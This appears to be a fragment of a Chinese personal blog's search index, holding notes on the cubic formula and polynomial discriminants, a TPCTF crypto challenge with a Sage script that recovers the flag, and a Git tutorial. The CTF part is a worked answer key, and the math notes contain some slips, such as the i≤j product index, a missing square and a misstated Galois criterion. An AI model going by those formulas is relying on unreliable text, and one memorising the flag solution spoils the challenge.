首先得出不含二次项的一元三次方程求根公式. Niccolò Fontana “Tartaglia” 独立得出一元三次方程求根公式. Girolamo Cardano 拜访了Tartaglia，并获得了包含一元三次方程求根公式的暗语般的藏头诗. Lodovico Ferrari Cardano的学生在一元三次方程的求根公式的基础之上，给出了一元四次方程的求根公式 Galois 证明了，如果一个五次方程的置换群是一个不可分离的群，那么这个方程就没有求根公式 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:4:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"Cardano法 对于 一般的一元三次方程 $$ f(x) = ax^{3}+bx^{2} +cx +d=0,a,b,c,d\\in C,a \\ne 0\\tag{1} $$ 由代数基本定理，在复数域上有三个根。 简化为一元三次首一多项式：$$f'(x) = x^{3}+ b’x^{2}+ c’x +d' \\tag{2}$$ 配方法代换： 令$z= x+ \\frac{b'}{3}$（消去二次项为目的） $$z^{3} + pz + q = 0 \\tag{3}$$ 令$z= u+v$ $$ (u+v)^{3}+p(u+v)+q=0 $$ 整理得： $$ u^{3}+ v^{3} +3uv(u+v)+p(u+v)+q=0 $$ 即： $$(u+v)(3uv+p)=-q-(u^3+v^3)\\tag{4}$$ 考虑一种特殊的情况 $$\\begin{cases}3uv +p \u0026= 0 \\\\ u^{3}+v^{3}+q \u0026= 0 \\end{cases}\\tag{5}$$ 显然方程组$(5)$一定有解，且$(5)$的解一定是不定方程$(4)$的一个解。退而求其次，先找到原方程的一个解先。 $$(u^{3} - v^{3})= (u^3+v^3)^2-4u^3v^3$$ 代入得 $$(u^3-v^3)^2=q^2+\\frac{4}{27}p^3$$ 不妨取： $$\\begin{aligned} u^{3}\u0026= - \\frac{q}{2} \\pm \\sqrt{ \\frac{q^2}{4}+\\frac{p^3}{27} }\\\\ v^{3}\u0026= - \\frac{q}{2} \\mp \\sqrt{ \\frac{q^2}{4}+\\frac{p^3}{27} } \\end{aligned} $$ 特殊化 $$\\begin{cases} u^3 \u0026= - \\frac{q}{2}+\\sqrt{\\frac{q^2}{4}+\\frac{p^3}{27}} \\\\ v^3 \u0026= - \\frac{q}{2}- \\sqrt{\\frac{q^2}{4}+\\frac{p^3}{27}}\\end{cases}$$ 不难开三次方，在得到$z=u+v$就是一元三次方程的一个根。 判别式$\\Delta= \\frac{q^2}{4}+\\frac{p^3}{27}$即为判别式。 考虑特殊情况： $x^{3}=1$的三个根。 欧拉公式 $$e^{i\\theta} = \\cos \\theta + i \\sin \\theta$$ 注意到，$\\omega^{3} =1,\\omega = e^{\\frac{2\\pi i}{3}}=\\frac{-1+\\sqrt{ 3 }i}{2}$ 不难得到 $$\\begin{cases}\\omega\u0026=e^{\\frac{2\\pi i}3}=\\frac{-1+\\sqrt{3}i}2\\\\ \\omega^2\u0026=e^{\\frac{4\\pi i}3}=\\frac{-1-\\sqrt{3}i}2\\\\ \\omega^3\u0026=e^{2\\pi i}=1\u0026\\end{cases}$$ 恰好构成一个三阶循环群，可以在复平面内表示这三个根。 回到方程$z^{3}+pz +q = 0$： $u=u_{0},v= v_{0}$是方程组$(5)$的一个解, 那么,由工具$\\omega$可得方程组$(5)$的三组不同解： $$\\begin{cases}z\u0026=\\omega^0u_0+\\omega^0v_0\\\\z\u0026=\\omega^1u_1+\\omega^1v_1\\\\z\u0026=\\omega^2u_2+\\omega^2v_2\\end{cases}$$ 至此，我们的求解已经完成. 代回的形式可表示为： 判别式$\\Delta= \\frac{q^2}{4}+\\frac{p^3}{27}$即为判别式 $\\Delta \u003e 0$，方程有1个解 $\\Delta = 0$，方程有2个解 $\\Delta \u003c 0$，方程有3个解 判别式的一般定义： 对于多项式$P(x)=a_{n}x_{n}+a_{n-1}x_{n-1}+\\dots+a_{1}x+a_{0}$，在复数域上存在$n$个根 $x_{1},x_{2},\\dots,x_{n}$其判别式为 $$\\Delta=a_{n}^{2n-2}\\Pi_{1 \\le i \\le j \\le n}(x_{i}-x_{j})^2$$ 显然$\\Delta$为一个对称多项式. 例： 二次情况。 $$\\Delta=(x_{1}-x_{2})^2=(x_{1}+x_{2})^2-4x_{1}x_{2}=b^2-4ac$$ 这更直接的告诉我们：根之间的关系，是否相等，这才是判别式的本质，解一元多次方程的关键，这触及了群论的本质——对称。 Crypto实践 from secret import flag assert flag[:6] == 'TPCTF{' and flag[-1] == '}' flag = flag[6:-1] assert len(set(flag)) == len(flag) xs = [] for i, c in enumerate(flag): xs += [ord(c)] * (i + 1) p = 257 print('output =', [sum(pow(x, k, p) for x in xs) % p for k in range(1, len(xs) + 1)]) from Crypto.Util.number import * output = [125, 31, 116, 106, 193, 7, 38, 194, 186, 33, 180, 189, 53, 126, 134, 237, 123, 65, 179, 196, 99, 74, 101, 153, 84, 74, 233, 5, 105, 32, 75, 168, 161, 2, 147, 18, 68, 68, 162, 21, 94, 194, 249, 179, 24, 60, 71, 12, 40, 198, 79, 92, 44, 72, 189, 236, 244, 151, 56, 93, 195, 121, 211, 26, 73, 240, 76, 70, 133, 186, 165, 48, 31, 39, 3, 219, 96, 14, 166, 139, 24, 206, 93, 250, 79, 246, 256, 199, 198, 131, 34, 192, 173, 35, 0, 171, 160, 151, 118, 24, 10, 100, 93, 19, 101, 15, 190, 74, 10, 117, 4, 41, 135, 45, 107, 155, 152, 95, 222, 214, 174, 139, 117, 211, 224, 120, 219, 250, 1, 110, 225, 196, 105, 96, 52, 231, 59, 70, 95, 56, 58, 248, 171, 16, 251, 165, 54, 4, 211, 60, 210, 158, 45, 96, 105, 116, 30, 239, 96, 37, 175, 254, 157, 26, 151, 141, 43, 110, 227, 199, 223, 135, 162, 112, 4, 45, 66, 228, 162, 238, 165, 158, 27, 18, 76, 36, 237, 107, 84, 57, 233, 96, 72, 6, 114, 44, 119, 174, 59, 82, 202, 26, 216, 35, 55, 159, 113, 98, 4, 74, 2, 128, 34, 180, 191, 8, 101, 169, 157, 120, 254, 158, 97, 227, 79, 151, 167, 64, 195, 42, 250, 207, 213, 238, 199, 111, 149, 18, 194, 240, 53, 130, 3, 188, 41, 100, 255, 158, 21, 189, 19, 214, 127] p = 257 P = output e = [] for i in range(253): temp = 0 for j in range(i): temp += (-1)**j * e[j] * P[i-j-1] temp %= p temp = (P[i] - temp) % p ei = temp * inverse((-1)^i*(i+1), p) % p e.append(ei) a = [1] for i in range(len(e)): a.append((-1)^(i+1) * e[i] % p) PR.\u003cx\u003e = PolynomialRing(Zmod(p)) f = 0 for i in range(253): f += x^(253-i)*a[i] f += a[-1] res = f.roots() #get flag flag = [0 for i in range(22)] for i in res: flag[i[1]-1] = chr(i[0]) print(\"TPCTF{\" + \"\".join(flag) + \"}\") #TPCTF{polyisfun_MJCQz:a^VX\"G} ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:5:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"That is git! 1.概述 git 是目前较为先进的分布式版本控制系统。 ","date":"2024-04-04","objectID":"/noteforgit/:0:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"原理和流程： 此处的Repository 一般指代本地仓库，Remote则为远程仓库。 ","date":"2024-04-04","objectID":"/noteforgit/:1:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"SVN \u0026 Git ： SVN是集中式版本控制系统，版本库统一存放在中央服务器，工作时需要从中央服务器获取最新版本，工作后将工作成果返回中央服务器。基于此，SVN需要联网工作，互联网条件下易受带宽限制。 Git是分布式版本控制系统，无中央服务器，工作时可不必联网，但多人协作需要互相推送各自修改。 ","date":"2024-04-04","objectID":"/noteforgit/:2:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"功能: 一个良好的多端同步工具，可记录与返回历史版本，为多人协作实现便利。 ","date":"2024-04-04","objectID":"/noteforgit/:3:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"缘起： Linux的发展过程中，开源文化与开源开发者扮演了重要角色，而版本控制的需求日益增长，手工合并的实现日渐不能满足需求，linus认为CVS和SVN既有带宽的弊端，也违背开源文化，于是乎Lin us花了两周时间自己用C写了一个分布式版本控制系统 ","date":"2024-04-04","objectID":"/noteforgit/:4:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"Git on Windows Windows 下在官网下载并安装后，可进行配置： $ git config --global user.name \"Your Name\" $ git config --global user.email \"email@example.com\" –global参数表示全局，即本机使用git时已经选定了特定仓库，当然也可以为特定的本地仓库指定远程仓库。 2.Repository 可以简单理解为一个目录，目录内所有文件均可被git管理。其中每个文件的修改、删除，均可被git追踪，一辩任何时刻均可追溯历史，或者在将来某个时刻进行还原。 ","date":"2024-04-04","objectID":"/noteforgit/:5:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.1创建Repository： Step_0: $mkdir learngit $cd learngit $pwd /halois/learngit win下保证目录树中无中文，以避免奇怪的问题发生 Step_1: $git init Step_2 $git add \u003cfilename\u003e or \u003cdirectories\u003e Step_3 $git commit -m \"Explanatory statement\" Warning：不可含有任何中文 ","date":"2024-04-04","objectID":"/noteforgit/:6:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.2快照功能 git log 查看最近到最远的提交日志，即 “Explanatory statement” git status (base) PS E:\\desktop\\blogdemo\u003e git status On branch master nothing to commit, working tree clean git reset 回到上一个提交： git reset --hard HEAD^ 如果没有上一个提交将会: PS E:\\desktop\\blogdemo\u003e git reset --hard HEAD^ fatal: ambiguous argument 'HEAD^': unknown revision or path not in the working tree. Use '--' to separate paths from revisions, like this: 'git \u003ccommand\u003e [\u003crevision\u003e...] -- [\u003cfile\u003e...]' 请注意，git reset --hard命令是一个危险的操作，它会丢弃所有未提交的更改，并将分支移动到指定的提交。请确保在执行此命令之前备份重要的更改 HEAD指向当前版本。 其后可接指令或commit的版本号前几位即可，回退到指定版本，即便又所删除，只要shell尚未关闭，一切仍然可以挽回。 git reflog 查看历史版本号。 ","date":"2024-04-04","objectID":"/noteforgit/:7:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.3工作区和暂存区 Git区别于其他控制系统，如SVN含有暂存区。 工作区(Working Directory)：可见的目录（文件夹） 版本库(Repository): 工作区内含有一个名为.git的隐藏文件夹,这里在工作区的目录之中却在工作区之外，称为版本库。 内含：stage, master(分支)、指向master的一个指针叫做HEAD等 git add:把文件添加进入暂存区 git commit:把暂存区文件提交到当前分支 ","date":"2024-04-04","objectID":"/noteforgit/:8:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.4其他修改 git checkout – 工作区丢弃最近一次修改，返回最近的commit后状态。 git reset HEAD 可以把暂存区的修改撤销掉，重新放回工作区 情况1：文件只在工作区操作，未add。撤销操作：git restore 。结果：工作区文件回退。 情况2：文件已add，未commit。撤销操作：git restore –staged 。结果：暂存区文件回退，工作区文件未回退，如需继续回退，操按情况1操作。 情况3：文件已add，已commit。撤销操作：git reset –hard commit_id。结果：工作区文件、暂存区文件、本地仓库都回退 ","date":"2024-04-04","objectID":"/noteforgit/:9:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.5删除文件 rm 工作区内删除 git rm 版本库中删除 git checkout – 版本库中覆盖工作区中指定文件 3.远程仓库(remote) 以github 为例。 ","date":"2024-04-04","objectID":"/noteforgit/:10:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.1创建远程库 Remote端： 创建新仓库 本地: 在本地仓库目录下：git remote add origin git@github.com:\u003crepositoryname\u003e 此处的origin是git识别的远程仓库名字，可以修改，但是默认remote即命名为 origin 下一步就可以：本地上传远程 git push -u origin master git push是将本地内容推送到远程，上述命令把当前的分支master推送到远程。 -u参数 由于是第一次推送，使用-u推送后可以使得笨的的master和远程仓库的master关联起来，在以后的推送和拉去可以简化命令 git push origin master ","date":"2024-04-04","objectID":"/noteforgit/:11:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.2删除远程库 查看远程库信息： git remote -v 删除远程库： git remote rm \u003cRemotename\u003e 删除的含义：解除本地与远程的链接。如需要彻底删除，则需要进入远程库的管理系统进行删除。 ","date":"2024-04-04","objectID":"/noteforgit/:12:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.3远程传本地 git clone \u003cssh/https to your repository\u003e 4.分支管理 git 分支实际上是更改指向更改快照的指针。 ","date":"2024-04-04","objectID":"/noteforgit/:13:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.1创建与合并分支 HEAD、Branch、Commit $**p,*p,p$ 创建分支： git branch (branchname) 切换分支： git checkout (branchname) 切换分支时git会用该分支的最近一次快照内容替换工作目录内容，多个分支不需要多个目录 合并分支： git merge命令用于合并指定分支到当前分支 合并方式：（可暂时不做了解） Fast-Forward合并： 语法：git merge \u003cbranch-name\u003e 描述：当目标分支（通常是主分支）没有新的提交时，可以使用Fast-Forward合并。这种合并方式会直接将目标分支指向源分支的最新提交，形成一个线性的提交历史。因为没有新的合并提交，所以合并后的提交历史非常简洁。 普通合并（Regular Merge）： 语法：git merge \u003cbranch-name\u003e 描述：普通合并是最常用的合并方式之一。它会创建一个新的合并提交，将两个分支的更改合并到一起。在执行合并操作时，Git会自动创建一个新的提交，包含两个分支的更改内容。这种合并方式会保留每个分支的提交历史，并在合并提交中保留合并的信息。 变基（Rebase）： 语法：git rebase \u003cbranch-name\u003e 描述：变基是另一种合并分支的方式。它将当前分支上的提交按照顺序逐个应用到目标分支上，使得目标分支的提交历史变得更加线性。变基操作可以将当前分支上的提交“移动”到目标分支的最新位置，这样就可以在合并时保持一个干净的提交历史。变基操作会改写提交的SHA标识，因此在共享分支时需要特别注意。 Squash合并（Squash Merge）： 语法：git merge --squash \u003cbranch-name\u003e 描述：Squash合并是将多个提交压缩为一个提交的方式。它会将一个分支上的所有提交合并成一个新的提交，并将其应用到目标分支上。这种合并方式适用于需要保持干净、整洁的提交历史，将多个相关的提交合并为一个更有意义的提交。 分支的时间线理解： 不直接修改时间线，仅仅修改指针。 git checkout -b dev 穿件并切换到；相当于 git branch dev git checkout dev 然后使用git branch查看分支状态 切换到已有的分支： git switch main 创建新的并切换到分支： git switch -c dev 这一更新是为了使得 git checkout 不那么容易混淆在版本库和工作区之间的操作。 ","date":"2024-04-04","objectID":"/noteforgit/:14:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.2解决冲突 合并分支并非一帆风顺，代码相与亦非易如反掌。 无法快速合并冲突 准备分支feature1，git switch -c feature1 分别作不同修改并提交，此时feature1和master所指提交不同，无法快速合并 报错如： $ git merge feature1 Auto-merging readme.txt CONFLICT (content): Merge conflict in readme.txt Automatic merge failed; fix conflicts and then commit the result. git status也可获得冲突信息 $ git status On branch master Your branch is ahead of 'origin/master' by 2 commits. (use \"git push\" to publish your local commits) //对比远程和本地的提交次数 You have unmerged paths. (fix conflicts and run \"git commit\") (use \"git merge --abort\" to abort the merge) Unmerged paths: (use \"git add \u003cfile\u003e...\" to mark resolution) both modified: readme.txt no changes added to commit (use \"git add\" and/or \"git commit -a\") 解决： ","date":"2024-04-04","objectID":"/noteforgit/:15:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.3分支协作 git merge --no-ff -m \"Explanatory statement\" \u003ctarget branch\u003e --no-ff参数表示禁用Fast forward模式，于是git在merge时会新生成一个提交，从分支历史上可清晰看见分支信息 基于此可以实现多人协作： ","date":"2024-04-04","objectID":"/noteforgit/:16:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.4临时分支 当前工作区工作可以缓存 git stash 缓存后会自动清除工作区，可以通过 git stash list 查看缓存 还原 还原缓存至工作区，但是不删除缓存 git stash apply 还原缓存至工作区，同时删除缓存 git stash pop 删除缓存 git stash drop 但是这不是简单的栈结构，这里可以多次缓存以特定编号指定恢复和删除。 $ git stash list stash@{0}: WIP on dev: f52c633 add merge $ git stash apply stash@{0} 临时分支的修改需要作用与其他分支 $git cherry-pick \u003ccode of commit\u003e ","date":"2024-04-04","objectID":"/noteforgit/:17:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.5测试分支 新的功能需求出现：建立测试分支 $git switch -c feature-test $git add test.py $git commit -m \"add features test\" $git switch dev $git branch -d feature-test 如中途功能取消： 删除未合并分支 $git branch -D feature-test -D强行删除 ","date":"2024-04-04","objectID":"/noteforgit/:18:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.6多人协作 查看远程仓库 $git remote origin 可以加入参数 -v以查看详细信息（origin的地址） 推送分支 把本地所有可推送内容推如指定分支。 $git push origin master 如果要推送其他分支如dev $git push origin dev 抓取分支 一般的，默认master(main)分支和dev分支均及推送，而这两个分支也大多会被及时抓取 新来的伙伴需要构建他的dev $git checkout -b dev origin/dev 建立了本地dev分支和远程的dev分支的关联。 值得注意的是需要先保持本地和远程一致，再提交自己的修改。 $git pull 在pull之前也首先需要建立一个链接 $git branch --set-upstream-to=origin/dev dev 多人协作一般方式： git push \u003cbranch name\u003e试图推送自己的修改 推送失败，git pull更新本地 pull有冲突解决冲突 再次push 5.标签管理 标签(tag)类似branch,但是不可移动，定向指向一个commit 创建标签 切换到需要打标签的分支上 git tag \u003cname\u003e git tag查看标签 对历史提交打标签 $git tag \u003ctagname\u003e \u003ccode of commit\u003e tag状态的排序按照字母顺序。 查看详细信息： $git show \u003ctagname\u003e 同样的可以加入一些说明性文字 $git tag -a v1.0 -m \"version 0.1 released\" 1024aa -a指定了标签名，-m加入说明性文字。均可以在git show中查看 标签是跨分支的，tag创建后在任何分支均可查看 6.忽略文件 部分文件需要放在工作目录中却不可以推送提交。 显示untracked不够优雅 创建.gitignore文件 忽略文件的原则： 忽略操作系统生成的文件 忽略编译中间产物 忽略敏感信息文件 失误操作的挽回： 检查.gitignore文件：git check-ignore 强制添加文件：git add -f \u003cfilename\u003e ","date":"2024-04-04","objectID":"/noteforgit/:19:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":null,"content":"About Halois","date":"2023-04-12","objectID":"/about/","tags":null,"title":"About me","uri":"/about/"},{"categories":null,"content":"Halois 灯火葳蕤揉皱你眼眉。 Do not go gentle into that good night. ","date":"2023-04-12","objectID":"/about/:0:0","tags":null,"title":"About me","uri":"/about/"}]